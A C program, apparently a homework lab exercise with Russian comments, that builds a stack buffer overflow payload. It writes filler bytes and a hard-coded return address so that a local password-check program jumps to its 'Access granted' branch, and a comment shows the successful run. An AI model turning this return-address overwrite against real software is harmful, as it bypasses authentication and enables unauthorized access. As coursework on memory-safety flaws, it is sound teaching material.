#include <stdio.h>
#include <stdlib.h>

#define ERROR_FILE_OPEN -3

void write_file(long long int);

int main(void){
    long long int address = 0x000000000040118f;//адрес начала команд ветки команд при истинном пароле

    printf("address = %#llx\n",address);
    write_file(address);
}

void write_file(long long int address_instr){//функция записи адреса в бинарный файл, для последующей передачи в программу проверки пароля
    FILE *output = NULL;
    int number;
 
    output = fopen("input.bin", "wb");
    if (output == NULL) {
        printf("Error opening file");
        getchar();
        exit(ERROR_FILE_OPEN);
    }
    
    char num = '1';

    for(int i = 0; i < 12; i++){//заполняем 20 байт чепухой(12 байт сам массив пароля 8 байт адрес rbp)
        fwrite(&num, sizeof(char), 1, output);
    }

    unsigned char *ptr = (char*)&address_instr;

    for(int i = 0; i < 8; i++, ptr++){//пишем адрес начала инструкций второй ветки проверки пароля (8 байт)
        printf("ptr[%d] = %#x\n",i,*ptr);
        fwrite(ptr, sizeof(char), 1, output);
    }
    
    fclose(output);

    //просмотр содержимого бинарного файла hexdump -C input.bin
    //перенаправление ввода ./test_dz < input.bin
    /*
    Итог:
        vitaliy@vitaliy-VivoBook-15-ASUS-Laptop-X540UBR:~/Рабочий стол/Eltex/dz/Eltex/Кадры$ ./test_dz < input.bin 
        Enter password:
        Access granted!
        Ошибка шины (стек памяти сброшен на диск)
    */
}